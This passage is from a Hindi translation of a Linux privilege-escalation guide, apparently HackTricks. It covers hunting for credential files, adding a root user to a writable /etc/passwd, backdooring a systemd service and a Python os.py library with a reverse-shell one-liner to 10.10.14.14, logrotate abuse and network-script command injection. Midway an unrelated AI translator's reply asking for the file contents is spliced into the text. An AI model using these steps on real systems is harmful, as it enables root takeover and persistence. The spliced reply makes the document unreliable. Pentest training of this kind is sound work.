The file `/etc/ssh_config` इस कॉन्फ़िगरेशन को **override** कर सकती है और इसे allow या deny कर सकती है.\
The file `/etc/sshd_config` `AllowAgentForwarding` की keyword के साथ ssh-agent forwarding को **allow** या **deny** कर सकती है (default allow है)।

यदि आप पाते हैं कि Forward Agent किसी environment में configured है तो निम्न पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## दिलचस्प फ़ाइलें

### प्रोफ़ाइल फ़ाइलें

फ़ाइल `/etc/profile` और `/etc/profile.d/` के अंतर्गत फ़ाइलें वे **scripts हैं जो उपयोगकर्ता नया shell चलाने पर execute होती हैं**। इसलिए, यदि आप उनमें से किसी को भी **लिख या संशोधित** कर सकते हैं तो आप escalate privileges कर सकते हैं।
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब profile script मिलता है तो आपको इसे **संवेदनशील विवरण** के लिए जांचना चाहिए।

### Passwd/Shadow Files

OS पर निर्भर करता है कि `/etc/passwd` और `/etc/shadow` फाइलें अलग नाम से हो सकती हैं या कोई backup हो सकता है। इसलिए यह अनुशंसित है कि **सभी को खोजें** और **जांचें कि क्या आप उन्हें पढ़ सकते हैं** ताकि देखें **यदि फाइलों के अंदर hashes हैं**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कुछ मामलों में आप `/etc/passwd` (या समकक्ष) फ़ाइल के अंदर **password hashes** पा सकते हैं
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

सबसे पहले, निम्नलिखित commands में से किसी एक का उपयोग करके एक password जनरेट करें।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the contents of src/linux-hardening/privilege-escalation/README.md. Please paste the file text here (or confirm I can fetch it). 

Also clarify how you want the "add the user `hacker` and add the generated password" handled:
- Should I append a markdown snippet showing the commands to create the user and set a password, or add a plain line in the file listing the generated password?
- Any password policy? (length, include symbols, etc.) If you don't specify, I'll generate a random 16-character password and include it literally in the translated markdown.

Once you provide the file (and confirm password rules), I'll translate the English to Hindi per your rules and add the requested user/password entry, preserving all markdown/html/tags/paths.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
उदा: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `su` कमांड का उपयोग `hacker:hacker` के साथ कर सकते हैं

वैकल्पिक रूप से, आप बिना पासवर्ड वाले एक डमी उपयोगकर्ता को जोड़ने के लिए निम्न पंक्तियों का उपयोग कर सकते हैं.\ चेतावनी: आप मशीन की वर्तमान सुरक्षा को कमजोर कर सकते हैं।
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
नोट: BSD प्लेटफ़ॉर्म्स में `/etc/passwd` `/etc/pwd.db` और `/etc/master.passwd` पर स्थित होता है, और `/etc/shadow` का नाम बदलकर `/etc/spwd.db` कर दिया गया है।

आपको जांचना चाहिए कि क्या आप **कुछ संवेदनशील फ़ाइलों में लिख सकते हैं**। उदाहरण के लिए, क्या आप किसी **सेवा कॉन्फ़िगरेशन फ़ाइल** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, यदि मशीन पर **tomcat** server चल रहा है और आप **Tomcat service configuration file को /etc/systemd/ के अंदर संशोधित कर सकते हैं,** तो आप इन लाइनों को संशोधित कर सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
आपका backdoor अगली बार tomcat शुरू होने पर निष्पादित किया जाएगा।

### फ़ोल्डरों की जाँच

निम्न फ़ोल्डरों में बैकअप्स या रोचक जानकारी हो सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (शायद आप अंतिम वाला पढ़ न पाएं, लेकिन कोशिश करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब स्थान/Owned फाइलें
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### पिछले कुछ मिनटों में संशोधित फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फ़ाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी हुई फ़ाइलें
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH में Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **वेब फ़ाइलें**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप्स**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Known files containing passwords

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) का code पढ़ें, यह **कई संभावित फाइलें जिनमें passwords हो सकते हैं** खोजता है।\
**एक और रोचक टूल** जिसे आप इसके लिए इस्तेमाल कर सकते हैं: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) जो एक ओपन-सोर्स एप्लिकेशन है जिसका उपयोग स्थानीय कंप्यूटर पर संग्रहीत बहुत सारे passwords प्राप्त करने के लिए किया जाता है, Windows, Linux & Mac के लिए।

### Logs

यदि आप logs पढ़ सकते हैं, तो आप उनमें **दिलचस्प/गोपनीय जानकारी** पा सकते हैं। जितना अजीब log होगा, उतना ही अधिक वह दिलचस्प होगा (शायद)।\
इसके अलावा, कुछ **"खराब"** configured (backdoored?) **audit logs** आपको audit logs के अंदर **record passwords** करने की अनुमति दे सकते हैं जैसा कि इस पोस्ट में बताया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/].
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**लॉग पढ़ने के लिए समूह** [**adm**](interesting-groups-linux-pe/index.html#adm-group) वास्तव में बहुत मददगार होगा।

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### सामान्य Creds खोज/Regex

आपको उन फाइलों की भी जाँच करनी चाहिए जिनमें शब्द "**password**" उनके **name** में या उनके **content** के भीतर मौजूद हो, और साथ ही logs के अंदर IPs और emails या hashes के regexps भी चेक करें।\
मैं यहाँ यह सब कैसे करना है विस्तार से नहीं बताऊंगा, लेकिन अगर आप रुचि रखते हैं तो आप देख सकते हैं कि [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) कौन-सी अंतिम जांचें perform करता है।

## लिखने योग्य फाइलें

### Python library hijacking

If you know from **where** a python script is going to be executed and you **can write inside** that folder or you can **modify python libraries**, you can modify the OS library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` में एक कमज़ोरी ऐसी users को जिनके पास किसी log फ़ाइल या उसकी parent directory पर **write permissions** हैं, संभावित रूप से उच्च विशेषाधिकार प्राप्त करने की अनुमति देती है। इसका कारण यह है कि `logrotate`, जो अक्सर **root** के रूप में चल रहा होता है, को arbitrary फ़ाइलें execute करने के लिए manipulate किया जा सकता है, खासकर ऐसे डायरेक्टरीज़ में जैसे _**/etc/bash_completion.d/**_. यह ज़रूरी है कि आप permissions सिर्फ _/var/log_ में ही नहीं बल्कि उन किसी भी डायरेक्टरी में चेक करें जहाँ log rotation लागू होती है।

> [!TIP]
> यह कमज़ोरी `logrotate` version `3.18.0` और पुराने को प्रभावित करती है

कमज़ोरी के बारे में अधिक विस्तृत जानकारी इस पेज पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

आप इस कमज़ोरी का exploit [**logrotten**](https://github.com/whotwagner/logrotten) के साथ कर सकते हैं।

यह कमज़ोरी [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** से बहुत मिलती-जुलती है, इसलिए जब भी आपको logs बदलने का मौका मिले, देखें कि वे logs कौन manage कर रहा है और जांचें कि क्या आप logs को symlinks से बदलकर privileges escalate कर सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

यदि किसी कारण से कोई user `_ /etc/sysconfig/network-scripts_` में `ifcf-<whatever>` स्क्रिप्ट **लिख** सके **या** मौजूदा स्क्रिप्ट को **समायोजित** कर सके, तो आपका **system is pwned**।

Network scripts, उदाहरण के लिए _ifcg-eth0_, network connections के लिए उपयोग किए जाते हैं। ये बिलकुल .INI files की तरह दिखते हैं। हालाँकि, इन्हें Linux पर Network Manager (dispatcher.d) द्वारा ~sourced~ किया जाता है।

मेरे मामले में, इन network scripts में `NAME=` atribuut सही तरह से संभाला नहीं जाता है। यदि नाम में **white/blank space in the name the system tries to execute the part after the white/blank space** होता है तो सिस्टम उस whitespace के बाद वाले हिस्से को execute करने की कोशिश करता है। इसका मतलब है कि **everything after the first blank space is executed as root**।

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_ध्यान दें कि Network और /bin/id_) 

### **init, init.d, systemd, and rc.d**

डायरेक्टरी `/etc/init.d` System V init (SysVinit) के लिए **स्क्रिप्ट्स** का स्थान है, जो कि **क्लासिक Linux service management system** है। इसमें सेवाओं को `start`, `stop`, `restart`, और कभी-कभी `reload` करने वाली स्क्रिप्ट्स शामिल होती हैं। इन्हें सीधे चलाया जा सकता है या `/etc/rc?.d/` में पाए जाने वाले symbolic links के माध्यम से। Redhat सिस्टम्स में वैकल्पिक पथ `/etc/rc.d/init.d` है।

दूसरी ओर, `/etc/init` **Upstart** से जुड़ा है, जो Ubuntu द्वारा पेश किया गया एक नया **service management** है और service management कार्यों के लिए configuration files का उपयोग करता है। Upstart पर संक्रमण के बावजूद, Upstart की compatibility layer के कारण SysVinit स्क्रिप्ट्स अभी भी Upstart configurations के साथ उपयोग में रहती हैं।

**systemd** एक आधुनिक initialization और service manager के रूप में उभरता है, जो on-demand daemon starting, automount management, और system state snapshots जैसे उन्नत features प्रदान करता है। यह फाइलों को `/usr/lib/systemd/` (distribution packages के लिए) और `/etc/systemd/system/` (administrator modifications के लिए) में व्यवस्थित करता है, जिससे system administration प्रक्रिया सरल हो जाती है।

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks आमतौर पर एक syscall को hook करते हैं ताकि privileged kernel functionality userspace manager को एक्सपोज़ की जा सके। कमजोर manager authentication (उदा., FD-order पर आधारित signature checks या कमजोर password schemes) एक local app को manager का impersonate करने और पहले से-rooted डिवाइसों पर root हासिल करने में सक्षम बना सकती है। अधिक जानकारी और exploitation विवरण यहाँ देखें:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux और MAC में kernel vulnerabilities को सूचीबद्ध करने के लिए [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Reference Manual – Shell Arithmetic](https://www.gnu.org/software/bash/manual/bash.html#Shell-Arithmetic)

{{#include ../../banners/hacktricks-training.md}}
